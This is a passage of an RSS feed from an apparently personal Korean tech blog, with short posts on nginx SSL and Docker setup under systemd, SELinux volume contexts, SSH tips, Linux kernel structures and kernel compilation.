&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;bash&quot;&gt;&lt;pre class=&quot;language-bash&quot;&gt;&lt;code class=&quot;language-bash&quot;&gt;&lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;root@micalgenus-com micalgenus&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;token comment&quot;&gt;# cat /etc/nginx/sites-available/default.conf&lt;/span&gt;
server &lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;
    listen &lt;span class=&quot;token number&quot;&gt;80&lt;/span&gt; default&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
    server_name _&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;
server &lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;
    listen &lt;span class=&quot;token number&quot;&gt;443&lt;/span&gt; ssl&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
    ssl on&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
    ssl_certificate     /etc/letsencrypt/live/micalgenus.com/fullchain.pem&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
    ssl_certificate_key /etc/letsencrypt/live/micalgenus.com/privkey.pem&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;sites-available 디렉토리에 설정파일을 만들었으니 이제 적용을 위해 심볼릭 링크를 만듭니다.&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;bash&quot;&gt;&lt;pre class=&quot;language-bash&quot;&gt;&lt;code class=&quot;language-bash&quot;&gt;&lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;root@micalgenus-com micalgenus&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;token comment&quot;&gt;# ln -s /etc/nginx/sites-available/default.conf /etc/nginx/sites-enabled/default.conf&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;서버를 재시작 하면 설정이 적용됨을 확인할 수 있습니다.&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;bash&quot;&gt;&lt;pre class=&quot;language-bash&quot;&gt;&lt;code class=&quot;language-bash&quot;&gt;&lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;root@micalgenus-com micalgenus&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;token comment&quot;&gt;# systemctl restart nginx&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;&lt;img src=&quot;/img/2019-02/setup-letsencryt-ssl-in-nginx-on-docker/img1.png&quot; alt=&quot;img1&quot;&gt;&lt;/p&gt;</content:encoded></item><item><title><![CDATA[Docker nginx 설치]]></title><description><![CDATA[Docker를 사용하여 nginx를 구동시키게 되면, 컨테이너 안에 넣음으로써 분리를 시킬 수 있고, 버전 업데이트를 편리하게 할 수 있습니다. 우선 최신버전의 nginx를 설치합니다. 그 후, 설정파일을 복사해 줍니다. CentOS…]]></description><link>https://micalgenus.github.io</link><guid isPermaLink="false">https://micalgenus.github.io</guid><pubDate>Fri, 15 Feb 2019 00:00:00 GMT</pubDate><content:encoded>&lt;p&gt;Docker를 사용하여 nginx를 구동시키게 되면, 컨테이너 안에 넣음으로써 분리를 시킬 수 있고, 버전 업데이트를 편리하게 할 수 있습니다.&lt;/p&gt;
&lt;p&gt;우선 최신버전의 nginx를 설치합니다.&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;bash&quot;&gt;&lt;pre class=&quot;language-bash&quot;&gt;&lt;code class=&quot;language-bash&quot;&gt;&lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;root@micalgenus-com micalgenus&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;token comment&quot;&gt;# docker run --name nginx -d -p 80:80 -p 443:443 nginx:latest&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;그 후, 설정파일을 복사해 줍니다.&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;bash&quot;&gt;&lt;pre class=&quot;language-bash&quot;&gt;&lt;code class=&quot;language-bash&quot;&gt;&lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;root@micalgenus-com micalgenus&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;token comment&quot;&gt;# docker cp nginx:/etc/nginx /etc/nginx&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;CentOS의 경우는 &lt;code class=&quot;language-text&quot;&gt;context&lt;/code&gt;때문에 docker에 마운트가 안되기 때문에 context를 맞춰줍니다.&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;bash&quot;&gt;&lt;pre class=&quot;language-bash&quot;&gt;&lt;code class=&quot;language-bash&quot;&gt;&lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;root@micalgenus-com micalgenus&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;token comment&quot;&gt;# chcon -R -u system_u -t svirt_sandbox_file_t /etc/nginx&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;로그 파일을 기록하기 위해 디렉토리를 만들어줍니다.&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;bash&quot;&gt;&lt;pre class=&quot;language-bash&quot;&gt;&lt;code class=&quot;language-bash&quot;&gt;&lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;root@micalgenus-com micalgenus&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;token comment&quot;&gt;# mkdir /var/log/nginx&lt;/span&gt;
&lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;root@micalgenus-com micalgenus&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;token comment&quot;&gt;# chcon -R -t svirt_sandbox_file_t -u system_u /var/log/nginx/&lt;/span&gt;
&lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;root@micalgenus-com micalgenus&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;token comment&quot;&gt;# chown 1000:root /var/log/nginx/&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;폴더를 만들었으니 실제 서버에 적용해 보겠습니다.&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;bash&quot;&gt;&lt;pre class=&quot;language-bash&quot;&gt;&lt;code class=&quot;language-bash&quot;&gt;&lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;root@micalgenus-com micalgenus&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;token comment&quot;&gt;# docker rm -f nginx # 컨테이너 종료 및 삭제&lt;/span&gt;
&lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;root@micalgenus-com micalgenus&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;token comment&quot;&gt;# docker run --name nginx -d -p 80:80 -p 443:443 -v /etc/nginx:/etc/nginx -v /var/log/nginx:/var/log/nginx nginx:latest&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;이제 서버가 재시작 될 때 컨테이너를 자동으로 시작하도록 해주어야 합니다.&lt;/p&gt;
&lt;p&gt;저의 경우는 &lt;code class=&quot;language-text&quot;&gt;systemd&lt;/code&gt;를 사용하여 서비스를 관리합니다. 이를 사용하면 docker pull을 이용하여 자동으로 최신버전을 유지하기 쉽기 때문에 이를 사용합니다.&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;bash&quot;&gt;&lt;pre class=&quot;language-bash&quot;&gt;&lt;code class=&quot;language-bash&quot;&gt;&lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;root@micalgenus-com micalgenus&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;token comment&quot;&gt;# cat /etc/systemd/system/nginx.service&lt;/span&gt;
&lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;Unit&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt;
&lt;span class=&quot;token assign-left variable&quot;&gt;Description&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt;Nginx Container
&lt;span class=&quot;token assign-left variable&quot;&gt;After&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt;docker.service
&lt;span class=&quot;token assign-left variable&quot;&gt;Requires&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt;docker.service

&lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;Service&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt;
&lt;span class=&quot;token assign-left variable&quot;&gt;TimeoutStartSec&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;0&lt;/span&gt;
&lt;span class=&quot;token assign-left variable&quot;&gt;Restart&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt;always
&lt;span class=&quot;token assign-left variable&quot;&gt;ExecStartPre&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt;/usr/bin/docker pull nginx:latest
&lt;span class=&quot;token assign-left variable&quot;&gt;ExecStart&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt;/usr/bin/docker run --name nginx -p &lt;span class=&quot;token number&quot;&gt;80&lt;/span&gt;:80 -p &lt;span class=&quot;token number&quot;&gt;443&lt;/span&gt;:443 -v /etc/nginx:/etc/nginx -v /var/log/nginx:/var/log/nginx nginx:latest
&lt;span class=&quot;token assign-left variable&quot;&gt;ExecStop&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt;/usr/bin/docker stop -t &lt;span class=&quot;token number&quot;&gt;2&lt;/span&gt; nginx
&lt;span class=&quot;token assign-left variable&quot;&gt;ExecStopPost&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt;/usr/bin/docker &lt;span class=&quot;token function&quot;&gt;rm&lt;/span&gt; -f nginx

&lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;Install&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt;
&lt;span class=&quot;token assign-left variable&quot;&gt;WantedBy&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt;multi-user.target&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;설정 파일을 만들어 준 후, 서비스를 재시작 해보겠습니다.&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;bash&quot;&gt;&lt;pre class=&quot;language-bash&quot;&gt;&lt;code class=&quot;language-bash&quot;&gt;&lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;root@micalgenus-com micalgenus&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;token comment&quot;&gt;# docker stop nginx&lt;/span&gt;
nginx
&lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;root@micalgenus-com micalgenus&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;token comment&quot;&gt;# docker rm nginx&lt;/span&gt;
nginx&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;우선 충돌이 나기 때문에 컨테이너를 삭제합니다.&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;bash&quot;&gt;&lt;pre class=&quot;language-bash&quot;&gt;&lt;code class=&quot;language-bash&quot;&gt;&lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;root@micalgenus-com micalgenus&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;token comment&quot;&gt;# systemctl start nginx&lt;/span&gt;
&lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;root@micalgenus-com micalgenus&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;token comment&quot;&gt;# docker ps -a&lt;/span&gt;
CONTAINER ID        IMAGE               COMMAND                  CREATED             STATUS              PORTS                                      NAMES
520cfd5e7c5e        nginx:latest        &lt;span class=&quot;token string&quot;&gt;&quot;nginx -g &apos;daemon ...&quot;&lt;/span&gt;   &lt;span class=&quot;token number&quot;&gt;2&lt;/span&gt; seconds ago       Up &lt;span class=&quot;token number&quot;&gt;1&lt;/span&gt; second         &lt;span class=&quot;token number&quot;&gt;0.0&lt;/span&gt;.0.0:80-&lt;span class=&quot;token operator&quot;&gt;&gt;&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;80&lt;/span&gt;/tcp, &lt;span class=&quot;token number&quot;&gt;0.0&lt;/span&gt;.0.0:443-&lt;span class=&quot;token operator&quot;&gt;&gt;&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;443&lt;/span&gt;/tcp   nginx&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;그 후 nginx를 시작합니다.&lt;/p&gt;
&lt;p&gt;systemd를 사용했기 때문에 서버 재시작을 쉽게 설정할 수 있습니다.&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;bash&quot;&gt;&lt;pre class=&quot;language-bash&quot;&gt;&lt;code class=&quot;language-bash&quot;&gt;&lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;root@micalgenus-com micalgenus&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;token comment&quot;&gt;# systemctl enable nginx&lt;/span&gt;
Created symlink from /etc/systemd/system/multi-user.target.wants/nginx.service to /etc/systemd/system/nginx.service.&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;</content:encoded></item><item><title><![CDATA[ssh 횟수 제한]]></title><description><![CDATA[를 사용할 때 무작위 공격을 통하여 사용자 아이디와 비밀번호를 알아내려 하는 공격이 있다. 이를 막기 위해서는 설정을 걸어주어야 한다. 이라는 소프트웨어를 이용하여 공격을 막을 수 있다.]]></description><link>https://micalgenus.github.io</link><guid isPermaLink="false">https://micalgenus.github.io</guid><pubDate>Mon, 27 Feb 2017 00:00:00 GMT</pubDate><content:encoded>&lt;p&gt;&lt;code class=&quot;language-text&quot;&gt;sshd&lt;/code&gt;를 사용할 때 무작위 공격을 통하여 사용자 아이디와 비밀번호를 알아내려 하는 공격이 있다.&lt;/p&gt;
&lt;p&gt;이를 막기 위해서는 설정을 걸어주어야 한다.&lt;/p&gt;
&lt;p&gt;&lt;code class=&quot;language-text&quot;&gt;fail2ban&lt;/code&gt;이라는 소프트웨어를 이용하여 공격을 막을 수 있다.&lt;/p&gt;</content:encoded></item><item><title><![CDATA[docker directory mapping with selinux]]></title><description><![CDATA[http://stackoverflow.com/questions/24288616/permission-denied-on-accessing-host-directory-in-docker 를 사용하는 환경에서 docker…]]></description><link>https://micalgenus.github.io</link><guid isPermaLink="false">https://micalgenus.github.io</guid><pubDate>Mon, 20 Feb 2017 00:00:00 GMT</pubDate><content:encoded>&lt;p&gt;&lt;a href=&quot;http://stackoverflow.com/questions/24288616/permission-denied-on-accessing-host-directory-in-docker&quot;&gt;http://stackoverflow.com/questions/24288616/permission-denied-on-accessing-host-directory-in-docker&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;code class=&quot;language-text&quot;&gt;selinux&lt;/code&gt;를 사용하는 환경에서 docker를 사용할 경우 디렉토리를 매핑하려 할 때 &lt;strong&gt;Permission denied&lt;/strong&gt;가 뜨는 경우가 있다.&lt;/p&gt;
&lt;p&gt;이 때에는 다음과 같이 설정해주면 된다.&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;bash&quot;&gt;&lt;pre class=&quot;language-bash&quot;&gt;&lt;code class=&quot;language-bash&quot;&gt;chcon -R -t svirt_sandbox_file_t /path/to/volume&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;</content:encoded></item><item><title><![CDATA[ssh password 저장]]></title><description><![CDATA[ssh-copy-id 를 사용하면 저장하여 사용할 수 있다. ssh-copy-id가 없을 경우 https://blog.asamaru.net/2016/01/26/ssh-login-without-password/와 같이 할 수 있다.]]></description><link>https://micalgenus.github.io</link><guid isPermaLink="false">https://micalgenus.github.io</guid><pubDate>Sat, 18 Feb 2017 12:00:00 GMT</pubDate><content:encoded>&lt;p&gt;ssh-copy-id 를 사용하면 저장하여 사용할 수 있다.&lt;/p&gt;
&lt;p&gt;ssh-copy-id가 없을 경우 &lt;a href=&quot;https://blog.asamaru.net/2016/01/26/ssh-login-without-password/&quot;&gt;https://blog.asamaru.net/2016/01/26/ssh-login-without-password/&lt;/a&gt;와 같이 할 수 있다.&lt;/p&gt;</content:encoded></item><item><title><![CDATA[Kernel get all task]]></title><description><![CDATA[http://stackoverflow.com/questions/19208487/kernel-module-that-iterates-over-all-tasks-using-depth-first-tree…]]></description><link>https://micalgenus.github.io</link><guid isPermaLink="false">https://micalgenus.github.io</guid><pubDate>Sat, 18 Feb 2017 00:00:00 GMT</pubDate><content:encoded>&lt;p&gt;&lt;a href=&quot;http://stackoverflow.com/questions/19208487/kernel-module-that-iterates-over-all-tasks-using-depth-first-tree&quot;&gt;http://stackoverflow.com/questions/19208487/kernel-module-that-iterates-over-all-tasks-using-depth-first-tree&lt;/a&gt;&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;c&quot;&gt;&lt;pre class=&quot;language-c&quot;&gt;&lt;code class=&quot;language-c&quot;&gt;&lt;span class=&quot;token keyword&quot;&gt;struct&lt;/span&gt; &lt;span class=&quot;token class-name&quot;&gt;task_struct&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt;task&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
​
&lt;span class=&quot;token function&quot;&gt;for_each_process&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;task&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;
     &lt;span class=&quot;token function&quot;&gt;printk&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token string&quot;&gt;&quot;Name: %s PID: [%d]\n&quot;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; task&lt;span class=&quot;token operator&quot;&gt;-&gt;&lt;/span&gt;comm&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; task&lt;span class=&quot;token operator&quot;&gt;-&gt;&lt;/span&gt;pid&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;와 같이 사용할 수 있다. 이를 이용하여 구하고자 하는 내용을 처리할 수 있다.&lt;/p&gt;</content:encoded></item><item><title><![CDATA[MySQL 비밀번호 변경]]></title><description><![CDATA[MySQL을 사용할 때 버전에 따라 비밀번호 바꾸는 방법이 다르다. https://dev.mysql.com/doc/refman/5.7/en/resetting-permissions.html 5.7버전의 경우는 다음과 같이 바꾸면 된다.]]></description><link>https://micalgenus.github.io</link><guid isPermaLink="false">https://micalgenus.github.io</guid><pubDate>Fri, 17 Feb 2017 18:00:00 GMT</pubDate><content:encoded>&lt;p&gt;MySQL을 사용할 때 버전에 따라 비밀번호 바꾸는 방법이 다르다.&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://dev.mysql.com/doc/refman/5.7/en/resetting-permissions.html&quot;&gt;https://dev.mysql.com/doc/refman/5.7/en/resetting-permissions.html&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;5.7버전의 경우는 다음과 같이 바꾸면 된다.&lt;/p&gt;</content:encoded></item><item><title><![CDATA[Kernel kuid_t]]></title><description><![CDATA[http://lxr.free-electrons.com/ident?i=kuid_t 위의 헤더파일을 포함하여야 사용할 수 있다.]]></description><link>https://micalgenus.github.io</link><guid isPermaLink="false">https://micalgenus.github.io</guid><pubDate>Fri, 17 Feb 2017 12:00:00 GMT</pubDate><content:encoded>&lt;p&gt;&lt;a href=&quot;http://lxr.free-electrons.com/ident?i=kuid_t&quot;&gt;http://lxr.free-electrons.com/ident?i=kuid_t&lt;/a&gt;&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;c&quot;&gt;&lt;pre class=&quot;language-c&quot;&gt;&lt;code class=&quot;language-c&quot;&gt;&lt;span class=&quot;token macro property&quot;&gt;&lt;span class=&quot;token directive-hash&quot;&gt;#&lt;/span&gt;&lt;span class=&quot;token directive keyword&quot;&gt;include&lt;/span&gt; &lt;span class=&quot;token string&quot;&gt;&amp;lt;linux/uidgid.h&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;위의 헤더파일을 포함하여야 사용할 수 있다.&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;c&quot;&gt;&lt;pre class=&quot;language-c&quot;&gt;&lt;code class=&quot;language-c&quot;&gt;&lt;span class=&quot;token keyword&quot;&gt;typedef&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;struct&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;token class-name&quot;&gt;uid_t&lt;/span&gt; val&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt; &lt;span class=&quot;token class-name&quot;&gt;kuid_t&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;</content:encoded></item><item><title><![CDATA[Kernel get_current]]></title><description><![CDATA[http://lxr.free-electrons.com/ident?i=get_current 위의 헤더 파일을 포함하여야 사용할 수 있다.]]></description><link>https://micalgenus.github.io</link><guid isPermaLink="false">https://micalgenus.github.io</guid><pubDate>Fri, 17 Feb 2017 06:00:00 GMT</pubDate><content:encoded>&lt;p&gt;&lt;a href=&quot;http://lxr.free-electrons.com/ident?i=get_current&quot;&gt;http://lxr.free-electrons.com/ident?i=get_current&lt;/a&gt;&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;c&quot;&gt;&lt;pre class=&quot;language-c&quot;&gt;&lt;code class=&quot;language-c&quot;&gt;&lt;span class=&quot;token macro property&quot;&gt;&lt;span class=&quot;token directive-hash&quot;&gt;#&lt;/span&gt;&lt;span class=&quot;token directive keyword&quot;&gt;include&lt;/span&gt; &lt;span class=&quot;token string&quot;&gt;&amp;lt;asm/current.h&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;위의 헤더 파일을 포함하여야 사용할 수 있다.&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;c&quot;&gt;&lt;pre class=&quot;language-c&quot;&gt;&lt;code class=&quot;language-c&quot;&gt;&lt;span class=&quot;token keyword&quot;&gt;static&lt;/span&gt; __always_inline &lt;span class=&quot;token keyword&quot;&gt;struct&lt;/span&gt; &lt;span class=&quot;token class-name&quot;&gt;task_struct&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;get_current&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token keyword&quot;&gt;void&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;token keyword&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;token function&quot;&gt;percpu_read_stable&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;current_task&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;</content:encoded></item><item><title><![CDATA[리눅스 절전모드 해제]]></title><description><![CDATA[http://dante2k.tistory.com/460 ubuntu 에 관한 글이지만, centos 에서도 정상적으로 작동하네요 ㅎㅎ]]></description><link>https://micalgenus.github.io</link><guid isPermaLink="false">https://micalgenus.github.io</guid><pubDate>Fri, 17 Feb 2017 00:00:00 GMT</pubDate><content:encoded>&lt;p&gt;&lt;a href=&quot;http://dante2k.tistory.com/460&quot;&gt;http://dante2k.tistory.com/460&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;ubuntu 에 관한 글이지만, centos 에서도 정상적으로 작동하네요 ㅎㅎ&lt;/p&gt;</content:encoded></item><item><title><![CDATA[XenServer update]]></title><description><![CDATA[https://openstack-xenserver.readthedocs.io/en/latest/07-build-xenserver-host.html]]></description><link>https://micalgenus.github.io</link><guid isPermaLink="false">https://micalgenus.github.io</guid><pubDate>Thu, 16 Feb 2017 12:00:00 GMT</pubDate><content:encoded>&lt;p&gt;&lt;a href=&quot;https://openstack-xenserver.readthedocs.io/en/latest/07-build-xenserver-host.html&quot;&gt;https://openstack-xenserver.readthedocs.io/en/latest/07-build-xenserver-host.html&lt;/a&gt;&lt;/p&gt;</content:encoded></item><item><title><![CDATA[커널 컴파일]]></title><description><![CDATA[리눅스 커널에 관한 공부를 하기 위해서는 커널컴파일을 하는 방법을 알아야 한다. 우선 필요한 커널을 다운로드 한다. OS 는 centos 7을 사용하였으며, 커널 버전은 3.16을 기준으로 작성하였다. https://kernel.org…]]></description><link>https://micalgenus.github.io</link><guid isPermaLink="false">https://micalgenus.github.io</guid><pubDate>Thu, 16 Feb 2017 12:00:00 GMT</pubDate><content:encoded>&lt;p&gt;리눅스 커널에 관한 공부를 하기 위해서는 커널컴파일을 하는 방법을 알아야 한다.&lt;/p&gt;
&lt;p&gt;우선 필요한 커널을 다운로드 한다. OS 는 centos 7을 사용하였으며, 커널 버전은 3.16을 기준으로 작성하였다.&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://kernel.org&quot;&gt;https://kernel.org&lt;/a&gt;에 접속하여 원하는 버전의 커널을 다운로드 한다.&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;bash&quot;&gt;&lt;pre class=&quot;language-bash&quot;&gt;&lt;code class=&quot;language-bash&quot;&gt;root@ubuntu:~&lt;span class=&quot;token comment&quot;&gt;# wget https://cdn.kernel.org/pub/linux/kernel/v3.x/linux-3.16.39.tar.xz&lt;/span&gt;
root@ubuntu:~&lt;span class=&quot;token comment&quot;&gt;# tar xf linux-3.16.39.tar.xz&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;파일을 받은 후 압축을 푼다. 그 후 컴파일을 해주면 된다.&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;bash&quot;&gt;&lt;pre class=&quot;language-bash&quot;&gt;&lt;code class=&quot;language-bash&quot;&gt;root@ubuntu:linux-3.16.39&lt;span class=&quot;token comment&quot;&gt;# cpunum=&quot;$(cat /proc/cpuinfo | grep cores | wc -l)&quot;&lt;/span&gt;
root@ubuntu:linux-3.16.39&lt;span class=&quot;token comment&quot;&gt;# make -j $cpunum&lt;/span&gt;
root@ubuntu:linux-3.16.39&lt;span class=&quot;token comment&quot;&gt;# make -j $cpunum modules_install&lt;/span&gt;
root@ubuntu:linux-3.16.39&lt;span class=&quot;token comment&quot;&gt;# make -j $cpunum install&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;</content:encoded></item><item><title><![CDATA[task_uid]]></title><description><![CDATA[task의 uid를 구하기 위해 라는 함수를 사용할 수 있다. 의 형태로 되어 있으며, uid_eq의 함수를 통하여 uid의 값이 일치하는지 확인할 수 있다. http://lxr.free-electrons.com/source/include/linux…]]></description><link>https://micalgenus.github.io</link><guid isPermaLink="false">https://micalgenus.github.io</guid><pubDate>Wed, 08 Feb 2017 00:00:00 GMT</pubDate><content:encoded>&lt;p&gt;task의 uid를 구하기 위해 &lt;code class=&quot;language-text&quot;&gt;task_uid&lt;/code&gt;라는 함수를 사용할 수 있다.&lt;/p&gt;
&lt;p&gt;&lt;code class=&quot;language-text&quot;&gt;kuid_t task_uid(task)&lt;/code&gt;의 형태로 되어 있으며, uid_eq의 함수를 통하여 uid의 값이 일치하는지 확인할 수 있다.&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;http://lxr.free-electrons.com/source/include/linux/cred.h#L347&quot;&gt;http://lxr.free-electrons.com/source/include/linux/cred.h#L347&lt;/a&gt;&lt;/p&gt;
